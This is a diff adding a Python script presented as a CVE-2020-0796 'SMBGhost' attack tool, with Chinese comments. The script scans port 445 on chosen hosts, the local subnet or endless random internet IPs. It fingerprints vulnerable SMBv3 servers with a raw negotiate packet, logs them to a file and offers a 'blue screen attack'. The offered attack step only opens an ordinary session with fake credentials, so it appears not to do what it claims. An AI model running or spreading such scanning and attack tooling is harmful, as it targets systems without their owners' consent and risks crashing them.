@@ -1,0 +1,140 @@
+#!/usr/bin/python3
+import socket #套接字模块,发送数据用的
+from random import randint as rand #随机模块
+from time import sleep #时间模块,调用的函数是sleep,就是延迟函数
+import struct #处理2进制的模块,处理数据包会用到
+import os #内核模块,调用内核函数的
+import sys #系统模块,调用系统函数
+from netaddr import IPNetwork #处理IP的，处理像192.168.1.0\24这样的内容
+from smbprotocol.connection import Connection
+from smbprotocol.session import Session
+import uuid #uuid
+#大部分我就不注释了
+def connectSMB(IP, username=None, password=None, port=445, encode=None, connectionTimeout=10):
+    _SMB_CONNECTIONS = {}
+    connection_key = "%s:%s" %(IP, port)
+    connection = _SMB_CONNECTIONS.get(connection_key, None)
+    if not connection:
+        connection = Connection(uuid.uuid4(), IP, port)
+        connection.connect(timeout=connectionTimeout)
+        _SMB_CONNECTIONS[connection_key] = connection
+    session = next((s for s in connection.session_table.values() if username is None or s.username == username), None)
+    if not session:
+        session = Session(connection, username=username, password=password, require_encryption=(encode is True))
+        session.connect()
+    elif encode is not None:
+        if session.encrypt_data and not encode:
+            print("\033[33m[-]Cannot disable encryption on an already negotiated session.\033[0m")
+        elif not session.encrypt_data and encode:
+            session.encrypt = True
+    return session
+def test_host(IP):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        status = sock.connect_ex((str(IP),445))
+        if status == 0:
+            print("\033[31m[-]\033[0m\033[33mTHE ATTACK MAY FALI, BUT THE HOST OF THE OTHER PARTY IS STIALL ALIVE\033[0m")
+        else:
+            print("\033[32m[+]THE ATTACK WAS SUCCESSFUL, BUT THE OTHER PARTY DID NOT RESPOND\033[0m")
+def randomIP():
+    return ("%d.%d.%d.%d"%(rand(0,255),rand(0,255),rand(0,255),rand(0,255)));
+def mode():
+    try:
+        SMBL = ("""\033[32m
+    +----------------------+
+    |CVE-2020-0796 SMBGhost|
+    +----------------------+
+\033[0m""")
+        if len(sys.argv) == 1:
+            print(SMBL)
+            a = input("\033[34m[+]\033[0mWHETHER TO ACTIVATE AUTOMATIC MODE? y/n/exit>")
+            if a == "exit":
+                exit(0)
+            if a == "n" or a == "N" or a == "NO" or a == "no":
+                while 1:
+                    ip = input("\033[34m[+]\033[0mENTER IP>")
+                    if ip == "help" or ip == "HELP":
+                        print("""
+command:
+        local -- scan localnetwork
+        help -- help
+        exit -- exit program
+""")
+                    if ip == "exit" or ip == "EXIT":
+                        exit(0);
+                    else:
+                        main(ip)
+                    if ip == "local" or ip == "local":
+                        for local in IPNetwork(socket.gethostbyname(socket.gethostname())+"/24"):
+                            main(str(local))
+                    else:
+                        main(ip)
+            elif a == "y" or a == "Y" or a == "yes" or a == "YES":
+                while 1:
+                    main(randomIP())
+                    sleep(1)
+                    continue
+            else:
+                print("\033[31m[-]\033[0m\033[33mINPUT ERROR,PLEASE CHECK THE INPUT\033[0m")
+        else:
+            argv_IP = sys.argv[1]
+            print(SMBL)
+            if argv_IP == "local" or argv_IP == "LOCAL":
+                for IP_ in IPNetwork(socket.gethostbyname(socket.gethostname())+"/24"):
+                    main(str(IP_))
+            elif argv_IP == "help" or argv_IP == "HELP":
+                print(r"""
+command:
+        local -- scan localnetwork
+        help -- help
+        exit -- quit
+        ip -- Scan the specified IP
+""")
+            elif argv_IP == "exit" or argv_IP == "EXIT":
+                exit(0)
+            else:
+                main(argv_IP)
+    except KeyboardInterrupt:
+        print("\033[33m[-]byebye\033[0m")
+def main(IP):
+    try:
+        port=445 #将445数字定义为port变量
+        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock: #定义socket的.. AF_INET是使用ipv4的,SOCK_STREAM是使用TCP数据   
+            sock.settimeout(10)
+            scan = sock.connect_ex((IP,port)) #对445端口发送一个数据包,测试445端口是否开启，开启则返回0，没有开启则返回其他数
+            if scan == 0: #如果打开则运行此行
+                print("\033[32m[+]\033[0m\033[33mIP %s --- PORT 445 OPEN/FILTRTED\033[0m"% IP)
+                with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as smb:
+                    smb.settimeout(10)
+                    try:
+                        smb.connect((IP, port)) 
+                    except:
+                        smb.close()
+                    smb.send(b'\x00\x00\x00\xc0\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x08\x00\x01\x00\x00\x00\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x\x00\x00\x00\x02\x00\x00\x00\x02\x02\x10\x02"\x02$\x02\x00\x03\x02\x03\x10\x03\x11\x03\x00\x00\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\n\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00') #发送数据包,sendall函数是发送完整的tcp数据包与send函数类似
+                    b, = struct.unpack("!I", smb.recv(4)) #处理返回回来的4字节的二进制数据包 
+                    recv = smb.recv(b) #处理数据包
+                    exploitCheck = (b"\x11\x03\x02\x00")
+                    if recv[68:72] != exploitCheck: #判断是否存在\x11\x03\x02\x00数据
+                        print("\033[31m[-]\033[0m\033[33mIP %s Not Vulnerable\033[0m"% IP) #如果存在则显示此行 
+                    elif recv[68:72] == exploitCheck: 
+                        print("\033[32m[+]\033[0m\033[33mIP %s Vulnerable\033[0m"% IP) #如果不存在则显示此行
+                        exp=input("\033[33m[+]\033[0mWHETHER TO PERFORM A BLUE SCREEN ATTACK[Y/N]>")
+                        if exp == "y" or exp == "YES" or exp == "yes" or exp == "Y":
+                            connectSMB(IP, username="fakeuser", password="fakepass", encode=False);test_host(IP)
+                        elif exp == "N" or exp == "n" or exp == "NO" or exp == "no":
+                            pass
+                        with open(os.getcwd()+"/cve_2020_0796-host.txt",mode="a") as f: #保存显示有漏洞的主机,os.getcwd()函数是显示终端所在的路径
+                            for i in "%s"%(IP): #循环..
+                                f.write(i) #写入
+                            f.close()
+            else: #判断
+                print("\033[31m[-]\033[0m\033[33mIP %s PARTY DID NOT OPEN PORT 445\033[0m"% IP) #如果对方没有打开445则显示此行
+    except KeyboardInterrupt: #当ctrl+c时则执行此行
+        print("\033[33m[-]byebye!\033[0m")
+        exit(1) #退出代码为1，就是异常退出
+    except ConnectionResetError: #如果连接失败则显示此行
+        print("\033[33m[-]PLEASE CHECK IF THE INTERNET PROTOCOL YOU ENTERED IS CORRECT\033[0m")
+    except socket.gaierror:
+        print("\033[33m[-]PLEASE CHECK IF THE INTERNET PROTOCOL YOU ENTERED IS CORRECT\033[0m")
+
+if __name__ == "__main__":
+    mode()
